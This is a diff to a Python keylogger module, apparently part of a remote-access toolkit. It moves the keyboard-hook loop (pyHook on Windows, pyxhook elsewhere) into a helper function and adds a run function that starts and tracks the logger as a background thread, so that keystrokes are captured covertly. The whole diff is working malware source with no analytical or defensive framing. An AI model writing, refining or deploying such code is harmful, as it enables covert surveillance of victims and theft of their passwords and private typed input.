@@ -60,15 +60,23 @@ def _event(event):
         util.log('{} error: {}'.format(event.func_name, str(e)))
     return True
 
-@util.threaded
-def run():
-    """ 
-    Run the keylogger
-
-    """
+def _run():
     while True:
         hm = pyHook.HookManager() if os.name == 'nt' else pyxhook.HookManager()
         hm.KeyDown = _event
         hm.HookKeyboard()
         pythoncom.PumpMessages() if os.name == 'nt' else time.sleep(0.1)
-        if globals()['abort']: break
+        if globals()['abort']: 
+            break
+
+def run():
+    """ 
+    Run the keylogger
+
+    """
+    try:
+        if 'keylogger' not in globals()['threads'] or not globals()['threads']['keylogger'].is_alive():
+            globals()['threads']['keylogger'] = threading.Thread(target=_run, name=time.time())
+        return globals()['threads']['keylogger']
+    except Exception as e:
+        util.log(str(e))
